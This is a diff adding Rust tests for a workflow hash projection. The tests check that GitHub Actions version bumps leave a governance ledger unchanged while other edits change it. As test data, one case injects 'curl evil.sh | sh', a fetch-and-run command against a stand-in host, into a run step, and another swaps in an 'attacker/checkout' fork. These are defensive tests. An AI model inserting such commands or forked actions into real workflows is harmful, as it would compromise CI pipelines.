@@ -1282,3 +1282,196 @@ fn a_superseding_spec_is_reported_as_inherited() {
         "{report:?}"
     );
 }
+
+// ── spec 073: a workflow folds as its governance projection ─────────────────
+
+/// A workflow whose bump must be invisible to the ledger, and whose every
+/// other edit must not be.
+const WF: &str = "name: CI\n\
+on:\n  push:\n    branches: [main]\n\
+jobs:\n\
+\x20 build:\n\
+\x20   runs-on: ubuntu-latest\n\
+\x20   env:\n      MODE: fast\n\
+\x20   steps:\n\
+\x20     - uses: actions/checkout@v4\n\
+\x20     - uses: actions/setup-node@8f152de45cc393bb48ce5d89d36b731f54556e65\n\
+\x20     - uses: ./.github/actions/local\n\
+\x20     - uses: some/action/sub@v1\n\
+\x20     - name: test\n        if: always()\n        run: cargo test\n";
+
+fn proj(content: &str) -> String {
+    spec_spine_core::manifest::workflow_hash_projection(content)
+        .expect("the fixture parses as a mapping")
+}
+
+/// Spec 073 3.1: only the pinned ref is dropped. A tag bump and a SHA-pin bump
+/// are the two shapes Dependabot produces, and neither is a governed change.
+#[test]
+fn a_uses_ref_bump_leaves_the_workflow_projection_unchanged() {
+    let base = proj(WF);
+    assert_eq!(base, proj(&WF.replace("checkout@v4", "checkout@v5")));
+    assert_eq!(
+        base,
+        proj(&WF.replace(
+            "8f152de45cc393bb48ce5d89d36b731f54556e65",
+            "1e31de5234b9f8995739874a8ce0492dc87873e2"
+        ))
+    );
+    // A subpath action bumps the same way, and its path is not the ref.
+    assert_eq!(
+        base,
+        proj(&WF.replace("some/action/sub@v1", "some/action/sub@v2"))
+    );
+}
+
+/// Spec 073 3.1: the action path is preserved. Dropping the whole `uses:`
+/// value would make swapping `actions/checkout` for a fork invisible to the
+/// ledger, which is the security property spec 030's waiver already relies on.
+#[test]
+fn changing_which_action_runs_changes_the_projection() {
+    let base = proj(WF);
+    assert_ne!(
+        base,
+        proj(&WF.replace("actions/checkout@v4", "attacker/checkout@v4"))
+    );
+    // The subpath is part of the identity, not part of the ref.
+    assert_ne!(
+        base,
+        proj(&WF.replace("some/action/sub@v1", "some/action/other@v1"))
+    );
+}
+
+/// Spec 073 3.1 and 3.5: unpinning is a change to the security posture, not a
+/// version bump. This is the case a bare `owner/action` projection would miss:
+/// `a/b@v4` and `a/b` would fold together and the unpin would be invisible.
+#[test]
+fn unpinning_an_action_changes_the_projection() {
+    assert_ne!(
+        proj(WF),
+        proj(&WF.replace("actions/checkout@v4", "actions/checkout"))
+    );
+}
+
+/// Spec 073 3.1: everything the projection does not recognize survives it.
+#[test]
+fn every_other_workflow_edit_changes_the_projection() {
+    let base = proj(WF);
+    for (label, head) in [
+        (
+            "run:",
+            WF.replace("cargo test", "cargo test && curl evil.sh | sh"),
+        ),
+        (
+            "with:",
+            WF.replace(
+                "- uses: actions/checkout@v4",
+                "- uses: actions/checkout@v4\n        with:\n          fetch-depth: 0",
+            ),
+        ),
+        ("env:", WF.replace("MODE: fast", "MODE: slow")),
+        ("if:", WF.replace("if: always()", "if: success()")),
+        (
+            "added step",
+            WF.replace(
+                "      - name: test",
+                "      - run: echo added\n      - name: test",
+            ),
+        ),
+        (
+            "added job",
+            WF.replace(
+                "jobs:\n",
+                "jobs:\n  other:\n    runs-on: ubuntu-latest\n    steps:\n      - run: true\n",
+            ),
+        ),
+        (
+            "trigger",
+            WF.replace("branches: [main]", "branches: [main, release]"),
+        ),
+        (
+            "runner",
+            WF.replace("runs-on: ubuntu-latest", "runs-on: macos-latest"),
+        ),
+        (
+            "local action",
+            WF.replace("./.github/actions/local", "./.github/actions/other"),
+        ),
+    ] {
+        assert_ne!(base, proj(&head), "a {label} edit must stale the ledger");
+    }
+}
+
+/// Spec 073 3.5: a comment-only or reformat-only edit leaves the parsed
+/// document unchanged, so it leaves the projection unchanged. Asserted rather
+/// than left to chance, because it is the projection's defined behavior and a
+/// reader could reasonably expect either answer.
+#[test]
+fn a_comment_or_reformat_only_workflow_edit_leaves_the_projection_unchanged() {
+    let base = proj(WF);
+    assert_eq!(base, proj(&format!("# a comment\n{WF}")));
+    assert_eq!(
+        base,
+        proj(&WF.replace("branches: [main]", "branches:\n      - main"))
+    );
+}
+
+/// Spec 073 3.1: over-hashing is the fail-closed direction. A file the parser
+/// cannot read stales on every edit rather than silently on none, which is
+/// what the npm and cargo projections already do.
+#[test]
+fn an_unparseable_workflow_falls_back_to_raw_bytes() {
+    assert!(spec_spine_core::manifest::workflow_hash_projection("a: [unclosed\n").is_none());
+    // A parseable document that is not a mapping is not a workflow either.
+    assert!(spec_spine_core::manifest::workflow_hash_projection("- just\n- a list\n").is_none());
+}
+
+/// Spec 073 3.5, end to end on a real index: the whole point of the change is
+/// that the global-inputs scalar every shard hash carries stops moving under a
+/// bump the bot cannot repair.
+#[cfg(feature = "symbol-resolution")]
+#[test]
+fn a_workflow_bump_leaves_every_shard_hash_alone_and_a_run_edit_does_not() {
+    let tmp = tempfile::tempdir().unwrap();
+    let root = tmp.path();
+    write(root, "Cargo.toml", "[workspace]\nmembers = []\n");
+    write(
+        root,
+        "spec-spine.toml",
+        "[index]\nextra_hashed_inputs = [\".github/workflows/**/*\"]\n",
+    );
+    write(
+        root,
+        "specs/001-a/spec.md",
+        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
+         summary: \"s\"\nestablishes:\n  - \".github/workflows/ci.yml\"\n---\n# 001-a\n## body\n",
+    );
+    write(root, ".github/workflows/ci.yml", WF);
+
+    let cfg =
+        spec_spine_types::load_config(&fs::read_to_string(root.join("spec-spine.toml")).unwrap())
+            .unwrap();
+    let before = shard::global_inputs_hash(&cfg, root);
+
+    write(
+        root,
+        ".github/workflows/ci.yml",
+        &WF.replace("checkout@v4", "checkout@v5"),
+    );
+    assert_eq!(
+        before,
+        shard::global_inputs_hash(&cfg, root),
+        "a `uses:` bump must leave the scalar every shard hash folds"
+    );
+
+    write(
+        root,
+        ".github/workflows/ci.yml",
+        &WF.replace("cargo test", "cargo bench"),
+    );
+    assert_ne!(
+        before,
+        shard::global_inputs_hash(&cfg, root),
+        "a `run:` edit is a governed change and must still stale the ledger"
+    );
+}
